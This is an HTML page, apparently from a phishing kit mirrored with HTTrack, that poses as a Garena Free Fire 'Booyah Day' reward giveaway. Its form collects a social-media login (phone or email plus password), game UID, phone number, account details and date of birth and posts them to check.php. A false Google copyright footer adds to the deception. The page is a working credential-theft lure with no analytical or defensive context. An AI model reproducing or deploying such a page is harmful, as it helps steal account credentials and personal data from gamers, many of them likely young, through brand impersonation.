<!=[] ★OBETBET★ --!>
  <!DOCTYPE html>
<html>
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png' rel='icon' type='image/x-png'/>
<title>Garena Free Fire - Booyah Day</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="ccss/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(../obetbet/background.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">
</div>
<center style="background:#EBA300;">

</div>
<center style="background:#000FFF;"><br>
<div class="col-md-8">
<h2>
<h2>
</h2>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#EBA300;width:100%" class="form-horizontal">
<h4 >

<form action="check.php" method="POST">
<h4 >
<img src="images/cheiffb.png" height="40px" width="90%">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb1" placeholder="Phone number or email address" type="text" minlength="10" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb2" placeholder="Password" type="password" minlength="6" required>
<br>
</div>
<h4 >
<img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png" height="50px" width="50px">
  <b> Account Details </b>
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="nickname" placeholder="Game Uid" type="number" minlength="10" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="phone" placeholder="Phone number" type="number" minlength="10" required>
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="elite" id="elite" required>
<option selected="selected" disabled="disabled" value="">Elite Pass</option> 
          <option>YES</option>
          <option>NO</option>
       </select>   
</div>
<div style="width:100%" class="form-group">
         <select class="form-control" name="rank" id="rank" required>
<option selected="selected" disabled="disabled" value="">CURRENT RANK</option>
          <option>Bronze</option>
          <option>Silver</option>
          <option>Gold</option>
          <option>Platinum</option>
          <option>Diamond</option>
          <option>Heroic</option>
          <option>Grand Master</option>
       </select>  
       <div style="width:100%" class="form-group">Date of Birth</div> <!--- details-tit --->
</div> <!--- details-tit-box --->
<select class="form-control" name="day" id="day" required>
<option selected="selected" disabled="disabled" value="">Day</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
</select>
<select class="form-control" name="month" id="month" required>
<option selected="selected" disabled="disabled" value="">Month</option>
<option>January</option>
<option>February</option>
<option>March</option>
<option>April</option>
<option>May</option>
<option>June</option>
<option>July</option>
<option>August</option>
<option>September</option>
<option>October</option>
<option>November</option>
<option>December</option>
</select>
<select class="form-control" name="year" id="year" required>
<option selected="selected" disabled="disabled" value="">Year</option>
<option>1990</option>
<option>1991</option>
<option>1992</option>
<option>1993</option>
<option>1994</option>
<option>1995</option>
<option>1996</option>
<option>1997</option>
<option>1998</option>
<option>1999</option>
<option>2000</option>
<option>2001</option>
<option>2002</option>
<option>2003</option>
<option>2004</option>
<option>2005</option>
<option>2006</option>
<option>2007</option>
<option>2008</option>
<option>2009</option>
<option>2010</option>
<option>2011</option>
<option>2012</option>
<option>2013</option>
<option>2014</option>
<option>2015</option>
<option>2016</option>
<option>2017</option>
<option>2018</option>
<option>2019</option>
<option>2020</option>
<option>2021</option>
<option>2022</option>
<option>2023</option>
</select>
</div>
<h3>
<div style="width:40%" class="form-group">
 <input type="submit" class="btn btn-block" style="color: #FFFFFF;background-color: #FF0000 ;" value="GET NOW"> </form>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
 
</div>
</div><br>
</div>

</div></div><br>
		  
<div style="height:110px;color: #000000;background-color: #EBA300;" class="btn btn-block">
<center><p>One Google Account for everything Google </p></center>
<img src="http://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/></p>
<p>Copyright &copy; 2023 Google Inc.</p></div>
</body>
</html>


